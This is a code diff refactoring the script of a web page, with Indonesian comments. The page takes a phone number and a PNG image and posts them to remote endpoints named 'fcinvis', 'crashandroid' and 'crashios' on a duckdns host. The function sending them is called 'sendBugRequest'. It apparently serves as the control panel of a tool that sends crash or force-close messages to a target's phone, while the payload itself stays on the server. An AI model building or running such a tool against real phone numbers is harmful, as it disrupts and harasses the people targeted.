@@ -115,52 +115,86 @@
   </div>
 
   <script>
-    // Dark-mode otomatis
-    if (matchMedia('(prefers-color-scheme: dark)').matches) document.body.classList.add('dark')
+// Dark-mode otomatis
+if (matchMedia('(prefers-color-scheme: dark)').matches) document.body.classList.add('dark')
 
-    const preview = document.getElementById('preview')
-    const pngInput = document.getElementById('pngInput')
-    const statusEl = document.getElementById('status')
+const preview = document.getElementById('preview')
+const pngInput = document.getElementById('pngInput')
+const statusEl = document.getElementById('status')
+const phoneInput = document.getElementById('phone')
 
-    pngInput.addEventListener('change', () => {
-      const file = pngInput.files[0]
-      if (!file) {
-        preview.src = 'https://via.placeholder.com/150x150.png?text=Preview'
-        return
-      }
-      const reader = new FileReader()
-      reader.onload = e => { preview.src = e.target.result }
-      reader.readAsDataURL(file)
+// Preview gambar saat pilih file
+pngInput.addEventListener('change', () => {
+  const file = pngInput.files[0]
+  if (!file) {
+    preview.src = 'https://via.placeholder.com/150x150.png?text=Preview'
+    return
+  }
+  const reader = new FileReader()
+  reader.onload = e => { preview.src = e.target.result }
+  reader.readAsDataURL(file)
+})
+
+// Fungsi umum untuk kirim request ke API
+async function sendBugRequest(apiUrl) {
+  const phone = phoneInput.value.trim()
+  const file  = pngInput.files[0]
+
+  if (!phone) {
+    statusEl.textContent = '❌ Nomor belum diisi'
+    return
+  }
+  if (!file) {
+    statusEl.textContent = '❌ Pilih PNG dulu'
+    return
+  }
+
+  statusEl.textContent = '⏳ Mengirim...'
+
+  try {
+    const base64 = await new Promise((res, rej) => {
+      const r = new FileReader()
+      r.onload = e => res(e.target.result.split(',')[1])
+      r.onerror = rej
+      r.readAsDataURL(file)
     })
 
-    document.getElementById('sendBtn').addEventListener('click', async () => {
-      const phone = document.getElementById('phone').value.trim()
-      const file  = pngInput.files[0]
-      if (!phone){ statusEl.textContent='❌ Nomor belum diisi'; return }
-      if (!file)  { statusEl.textContent='❌ Pilih PNG dulu'; return }
-
-      statusEl.textContent='⏳ Mengirim…'
-
-      try{
-        const base64 = await new Promise((res,rej)=>{
-          const r=new FileReader()
-          r.onload=e=>res(e.target.result.split(',')[1])
-          r.onerror=rej
-          r.readAsDataURL(file)
-        })
-        const resp=await fetch('https://test-function.duckdns.org//fcinvis',{
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({ phone, thumbnailData: base64 })
-        })
-        const data=await resp.json()
-        statusEl.textContent = data.ok ? '✅ Berhasil dikirim!' :
-          '⚠️ Gagal: '+(data.error||'Unknown')
-      }catch(err){
-        console.error(err)
-        statusEl.textContent='🚫 Tidak dapat terhubung ke server.'
-      }
+    const resp = await fetch(apiUrl, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ phone, thumbnailData: base64 })
     })
+
+    const data = await resp.json()
+    statusEl.textContent = data.ok ? '✅ Berhasil dikirim!' : '⚠️ Gagal: ' + (data.error || 'Unknown')
+
+  } catch (err) {
+    console.error(err)
+    statusEl.textContent = '🚫 Tidak dapat terhubung ke server.'
+  }
+}
+
+// Pasang event listener untuk masing-masing tombol dengan API berbeda
+document.getElementById('sendBtn').addEventListener('click', () => {
+  sendBugRequest('https://test-function.duckdns.org/fcinvis')
+})
+
+// Beri id ke tombol Android dan iOS supaya mudah dipanggil
+const androidBtn = document.querySelector('button[type="button"]:nth-child(1)')
+const iosBtn = document.querySelector('button[type="button"]:nth-child(2)')
+
+if(androidBtn) {
+  androidBtn.id = 'btnAndroid'
+  androidBtn.addEventListener('click', () => {
+    sendBugRequest('https://test-function.duckdns.org/crashandroid')
+  })
+}
+if(iosBtn) {
+  iosBtn.id = 'btnIOS'
+  iosBtn.addEventListener('click', () => {
+    sendBugRequest('https://test-function.duckdns.org/crashios')
+  })
+}
   </script>
 </body>
 </html>
